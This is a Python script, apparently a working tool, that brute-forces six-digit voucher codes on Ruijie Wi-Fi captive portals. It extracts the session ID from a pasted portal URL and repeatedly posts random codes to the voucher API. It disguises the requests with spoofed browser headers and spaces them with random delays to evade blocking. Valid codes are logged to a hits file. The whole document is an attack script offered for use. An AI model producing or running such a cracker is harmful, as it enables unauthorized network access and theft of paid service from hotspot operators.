import requests
import random
import time
import os
import re
from urllib.parse import urlparse

# --- [ UI COLORS ] ---
G = '\033[92m'  # Green
R = '\033[91m'  # Red
Y = '\033[93m'  # Yellow
C = '\033[96m'  # Cyan
W = '\033[0m'   # White
B = '\033[1m'   # Bold

def banner():
    os.system('clear')
    print(f"""
{C}╔══════════════════════════════════════════════════════════════╗
║ {W}██╗     ██╗  ██╗██╗  ██╗ █████╗ ███╗   ██╗████████╗         {C}║
║ {W}██║     ██║ ██╔╝██║  ██║██╔══██╗████╗  ██║╚══██╔══╝         {C}║
║ {W}██║     █████╔╝ ███████║███████║██╔██╗ ██║   ██║            {C}║
║ {W}██║     ██╔═██╗ ██╔══██║██╔══██║██║╚██╗██║   ██║            {C}║
║ {W}███████╗██║  ██╗██║  ██║██║  ██║██║ ╚████║   ██║            {C}║
║ {W}╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝            {C}║
╠══════════════════════════════════════════════════════════════╣
║      {G}● RUIJIE VOUCHER CRACKER v12.0 - [STEALTH MODE]         {C}║
║      {Y}● DEVELOPED FOR : LK HANT (NETWORK ADMIN)               {C}║
╚══════════════════════════════════════════════════════════════╝{W}
    """)

def start_cracking():
    banner()
    portal_url = input(f"{Y}[?] Paste Portal URL: {W}").strip()
    
    try:
        sid = re.search(r'sessionId=([a-zA-Z0-9_\-]+)', portal_url).group(1)
        parsed = urlparse(portal_url)
        api_url = f"{parsed.scheme}://{parsed.netloc}/api/auth/voucher/"
    except:
        print(f"\n{R}[!] URL Format Error! URL ကို အပြည့်အစုံ ကူးထည့်ပေးပါဗျ။{W}")
        return

    print(f"\n{G}[*] TARGET SID: {sid[:15]}...")
    print(f"[*] ATTACK MODE: 6-DIGIT BRUTEFORCE")
    print(f"[*] STATUS: ENGINE READY...{W}\n")
    print(f"{C}{'-'*62}{W}")

    count = 0
    while True:
        # 6-Digit Code Generation
        code = "".join([str(random.randint(0, 9)) for _ in range(6)])
        
        # Browser အစစ်ကဲ့သို့ ဟန်ဆောင်သော Headers
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "Referer": portal_url,
            "X-Requested-With": "XMLHttpRequest"
        }

        try:
            res = requests.post(api_url, 
                                json={"accessCode": code, "sessionId": sid, "apiVersion": 1}, 
                                headers=headers, 
                                timeout=7)
            
            count += 1
            if res.status_code == 200:
                # အောင်မြင်ရင် အသံမြည်အောင် သို့မဟုတ် ထင်ရှားအောင်ပြပါ
                print(f"\n{G}╔════════════════════════════════════════════╗")
                print(f"║ [✔] WORKING VOUCHER FOUND : {B}{code}{W}{G}       ║")
                print(f"╚════════════════════════════════════════════╝{W}\n")
                
                with open("lkhant_hits.txt", "a") as f:
                    f.write(f"Code: {code} | Time: {time.ctime()}\n")
                
                # အောင်မြင်တဲ့ ကုဒ်တွေ့ရင် ၁၀ စက္ကန့်ရပ်ပေးမည် (Browser မှာ ရိုက်ထည့်ရန်)
                time.sleep(10)
            else:
                # စစ်ဆေးနေဆဲ ကုဒ်များကို ပြပေးခြင်း
                print(f"{W}[{count}] {C}SCANNING:{W} {code} {R}» Invalid{W}", end="\r")

            # Block မခံရစေရန် Delay ထည့်ခြင်း (1.5s - 2.5s)
            time.sleep(random.uniform(1.5, 2.5))

        except KeyboardInterrupt:
            print(f"\n\n{R}[!] Stopped. Hits saved in lkhant_hits.txt{W}")
            break
        except:
            print(f"\n{R}[!] Connection Lost. Re-connecting...{W}")
            time.sleep(5)

if __name__ == "__main__":
    start_cracking()
